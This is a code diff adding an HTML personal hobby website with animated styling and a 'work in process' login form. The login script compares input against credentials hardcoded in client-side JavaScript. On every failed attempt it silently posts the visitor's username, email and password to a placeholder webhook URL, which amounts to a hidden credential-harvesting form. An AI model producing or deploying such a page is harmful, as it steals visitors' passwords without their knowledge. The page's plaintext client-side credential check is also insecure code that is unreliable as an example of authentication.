@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Danks Website</title>
+  <style>
+    body {
+      font-family: 'Press Start 2P', cursive;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(45deg, #ff1493, #8a2be2, #00008b);
+      background-size: 800% 800%;
+      animation: gradientAnimation 20s ease infinite, stars 150s linear infinite;
+      color: #e0ffff;
+      overflow-x: hidden;
+      perspective: 1500px;
+      position: relative;
+    }
+
+    @keyframes gradientAnimation {
+      0% { background-position: 0% 50%; }
+      25% { background-position: 50% 50%; }
+      50% { background-position: 100% 50%; }
+      75% { background-position: 50% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    @keyframes stars {
+      0% { background-position: 0 0; }
+      100% { background-position: 1000px 1000px; }
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent 200px);
+      background-size: 500px 500px;
+      animation: stars 150s linear infinite reverse;
+      opacity: 0.8;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 800px;
+      padding: 80px;
+      background: rgba(0, 0, 0, 0.9);
+      border-radius: 30px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9);
+      text-align: center;
+      position: relative;
+      z-index: 1;
+      transform-style: preserve-3d; /* Required for 3D transforms */
+      transform: rotateY(180deg); /* Initial rotation */
+      transition: transform 0.5s ease;
+    }
+
+    .container:hover {
+      transform: rotateY(0deg); /* Flip on hover */
+    }
+
+    .logo {
+      width: 200px;
+      margin-bottom: 60px;
+      filter: drop-shadow(6px 6px 10px rgba(255, 255, 255, 0.6));
+    }
+
+    h1 {
+      color: #ffff00;
+      font-size: 4.5rem;
+      margin-bottom: 50px;
+      text-shadow: 5px 5px 10px rgba(0, 0, 0, 1);
+      letter-spacing: 3px;
+    }
+
+    p {
+      color: #add8e6;
+      line-height: 2.2;
+      font-size: 1.5rem;
+      margin-bottom: 40px;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
+    }
+
+    .section-title {
+      color: #ff6347;
+      font-size: 3.5rem;
+      margin-bottom: 40px;
+      font-weight: bold;
+      text-shadow: 4px 4px 8px rgba(0, 0, 0, 0.9);
+      text-transform: uppercase;
+    }
+
+    a {
+      color: #00ffff;
+      text-decoration: none;
+      font-weight: bold;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
+      transition: color 0.3s ease, transform 0.3s ease;
+    }
+
+    a:hover {
+      color: #ff69b4;
+      text-decoration: underline;
+      transform: scale(1.1);
+    }
+
+    .login-container {
+      margin-top: 70px;
+      padding: 60px;
+      background: rgba(0, 0, 0, 0.9);
+      border-radius: 25px;
+      text-align: left;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.7);
+    }
+
+    .login-container h2 {
+      color: #ffff00;
+      margin-bottom: 35px;
+      text-align: center;
+      letter-spacing: 2px;
+    }
+
+    .login-container label {
+      display: block;
+      margin-bottom: 12px;
+      color: #add8e6;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 18px;
+      margin-bottom: 35px;
+      background: #222;
+      border: none;
+      border-radius: 12px;
+      color: #e0ffff;
+      font-size: 1.2rem;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 20px;
+      background: linear-gradient(to right, #ff4500, #ff8c00);
+      border: none;
+      border-radius: 12px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+      font-size: 1.3rem;
+    }
+
+    .login-container button:hover {
+      transform: scale(1.05);
+    }
+
+    .error-message {
+      color: #ff6347;
+      margin-top: 25px;
+      text-align: center;
+      font-size: 1.2rem;
+    }
+
+    #user-image {
+      position: absolute;
+      top: 50px;
+      right: 50px;
+      width: 80px;
+      border-radius: 50%;
+      display: none;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.8);
+      transition: transform 0.3s ease;
+    }
+
+    #user-image:hover {
+      transform: scale(1.1);
+    }
+
+    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="your-logo.png" alt="" class="logo"> <h1>Danks Website</h1>
+    <p>Welcome To My Website It Started When I Met A Person Named Skyreaper He Tought Me How To Dev And Code Kinda Now We Are Besties We Have A Modding Server Where We Mod GorillaTag Copies That Are Skidded</p>
+    <div class="section-title">My HTML Process</div>
+    <p>I Started To Learn HTML When i Found A Person Names G4 I Saw One Of His Websites I Thought i would learn Html So Thank U G4</p>
+    <div class="login-container">
+      <h2>Login (WORK IN PROCESS)</h2>
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username">
+      <label for="email">Email:</label>
+      <input type="text" id="email" name="email">
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password">
+      <button onclick="checkLogin()">Login</button>
+      <p id="error-message" class="error-message"></p>
+    </div>
+    <img id="user-image" src="your-user-image.png" alt="User Profile">
+  </div>
+
+  <script>
+    function checkLogin() {
+      const username = document.getElementById("username").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const errorMessage = document.getElementById("error-message");
+      const userImage = document.getElementById("user-image");
+      const webhookURL = "YOUR_WEBHOOK_URL";
+
+      if (username === "DanksUser1" && email === "danksuser.mail" && password === "dankshaspp") {
+        userImage.style.display = "block";
+        errorMessage.textContent = "";
+      } else {
+        userImage.style.display = "none";
+        errorMessage.textContent = "Incorrect username, email, or password.";
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "appalication/json",
+          },
+          body: JSON.stringify({
+            username: username,
+            email: email,
+            password: password,
+          }),
+        }).catch(error => console.error("Error sending to webhook:", error));
+      }
+    }
+  </script>
+
+</body>
+</html>
